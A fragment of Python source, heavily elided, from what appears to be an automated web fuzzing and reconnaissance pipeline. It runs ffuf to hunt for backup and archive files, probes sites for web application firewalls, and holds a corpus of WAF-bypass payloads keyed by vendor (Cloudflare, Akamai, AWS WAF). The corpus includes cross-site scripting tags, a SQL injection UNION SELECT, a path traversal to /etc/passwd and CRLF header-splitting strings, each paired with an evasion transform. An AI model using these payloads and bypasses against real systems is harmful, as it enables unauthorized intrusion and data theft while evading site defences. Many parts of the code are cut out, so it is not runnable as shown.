...
async def phase_08_FUZZ(
    ...
    if _PIPELINE_CFG.sample_mode == "minimal" and wordlist and Path(wordlist).exists():
        ...
        _wl_lines = [line for line in _wl_lines if line.strip()]
        if _wl_lines:
    ...
    if t.has("ffuf") and wordlist:
        ...
        if _PIPELINE_CFG.sample_mode == "minimal" and Path(ext_wordlist).exists():
            ...
            _ewl_lines = [line for line in _ewl_lines if line.strip()]
            if _ewl_lines:
                ...
                jobs.append(
                    (
                        ...
                        [
                            ...
                            ext_wordlist,
                            "-e",
                            ".php,.json,.bak,.old,.swp,.txt,.xml,.tar.gz,.zip",
                            "-mc",
                            "200,301,302,403",
                            "-o",
                            str(out_json),
    ...
    async def _active_waf_check(url: str) -> List[str]:
        ...
        for payload in _WAF_PROBE_PAYLOADS:
            try:
                ...
                req = urllib.request.Request(
                    probe_url, method="GET", headers={"User-Agent": "Mozilla/5.0"}
                )
...
_WAF_BYPASS_CORPUS: Dict[str, List[Dict[str, Any]]] = {
    "Cloudflare": [
        ...
        {
            "desc": "double URL encode",
            "transform": "double_url",
            "payload": "<script>alert(1)</script>",
        },
        {"desc": "mixed case", "transform": "mixed_case", "payload": "<sCrIpT>alert(1)</sCrIpT>"},
        {
            "desc": "parameter pollution via ;",
            "transform": "semicolon_param",
            "payload": "' UNION SELECT * FROM users--",
        },
        {
            "desc": "\\r\\n header split",
            "transform": "crlf_header",
            "payload": "../../../etc/passwd",
        },
    ],
    "Akamai": [
        {
            "desc": "unicode normalize",
            "transform": "unicode",
            "payload": "<script>alert(1)</script>",
        },
        {
            "desc": "response split via \\r in JSON",
            "transform": "json_cr",
            "payload": '{"user":"admin\\r\\n"}',
    ...
    "AWS WAF": [
        {
            "desc": "oversize body bypass",
            "transform": "oversize_body",
            ...
            try:
                ...
                if resp:
                    ...
                    if detected:
                        ...
                        findings.append(
                            f"[ws-fuzz-large-response] {ep} payload#{i} — {len(resp)} bytes"
                        )
            except asyncio.CancelledError:
                raise
            except Exception:
